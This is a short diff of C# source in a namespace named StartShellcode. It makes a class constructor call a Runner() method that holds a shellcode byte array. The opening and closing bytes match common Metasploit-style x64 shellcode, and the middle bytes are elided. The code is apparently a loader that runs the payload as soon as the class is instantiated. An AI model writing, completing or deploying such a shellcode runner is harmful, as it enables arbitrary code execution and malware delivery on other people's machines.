@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 
 namespace StartShellcode
@@ -23,10 +24,14 @@ namespace StartShellcode
 
         public TestClass()
         {
+            Runner();
+        }
+        public void Runner()
+        {
 
 
-            byte[] buf = new byte[659] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
-                ...
+            byte[] buf = new byte[] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
+            /*    ... */
             0xb5,0xa2,0x56,0xff,0xd5};
 
 
